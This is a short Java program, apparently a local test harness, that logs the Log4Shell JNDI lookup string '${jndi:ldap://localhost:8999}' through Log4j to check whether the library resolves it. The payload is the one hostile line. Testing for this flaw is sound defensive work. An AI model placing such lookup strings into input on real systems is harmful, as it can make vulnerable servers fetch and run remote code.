package com.tetlow.basic;

import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.LogManager;
 
public class BasicLogger {
   static Logger logger = LogManager.getLogger(BasicLogger.class);
 
   public static void main(String... args) {
      System.out.println("Main says, 'Hello, world.'");
      //logger.error(args.length > 0 ? args[0] : "[no data provided to log]");
      logger.error("${jndi:ldap://localhost:8999}");
      System.out.println("Main is exiting.");
   }
}